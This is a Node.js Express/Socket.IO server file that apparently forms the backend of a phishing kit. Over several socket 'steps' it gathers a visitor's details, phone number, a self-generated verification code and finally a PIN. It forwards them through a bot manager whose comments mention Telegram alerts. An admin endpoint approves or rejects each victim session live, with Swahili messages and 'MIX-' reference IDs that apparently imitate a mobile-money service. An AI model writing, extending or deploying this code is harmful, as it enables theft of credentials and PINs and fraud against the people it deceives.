const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, { cors: { origin: "*" } });
const sessions = new Map();

io.on('connection', (socket) => {
    sessions.set(socket.id, { data: { socketId: socket.id }, otp: null });

    // STEP 1
    socket.on('step1', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep1(session.data);
        }
    });

    // STEP 2
    socket.on('step2', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep2(session.data);
        }
    });

    // STEP 3
    socket.on('step3-data', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep3(session.data);
        }
    });

    // STEP 4 - GENERATE (No Telegram Alert)
    socket.on('send-otp', (data) => {
        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        const session = sessions.get(socket.id);
        if (session) {
            session.otp = otp;
            session.data.phone = data.phoneNumber;
            console.log(`[OTP] Generated for ${socket.id}: ${otp}`);
            socket.emit('otp-sent');
        }
    });

    // STEP 4 - VERIFY (Triggers Telegram Alert)
    socket.on('step4-otp', (data) => {
        const session = sessions.get(socket.id);
        if (session && session.otp === data.otp) {
            // SUCCESS: Only now we tell the Admin
            botManager.sendStep4({ socketId: socket.id, otp: data.otp });
            socket.emit('otp-verified');
        } else {
            socket.emit('admin-rejected', { message: 'Namba ya uhakiki si sahihi.' });
        }
    });

    // STEP 5
    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data.pin = data.pin;
            botManager.sendStep5(session.data);
        }
    });

    socket.on('disconnect', () => sessions.delete(socket.id));
});

app.post('/admin/action', (req, res) => {
    const { socketId, action } = req.body;
    if (action === 'approve') {
        io.to(socketId).emit('admin-approved', { referenceId: "MIX-" + Date.now() });
    } else {
        io.to(socketId).emit('admin-rejected', { message: 'Maombi yamekataliwa.' });
    }
    res.sendStatus(200);
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Production Server Live on Port ${PORT}`);
});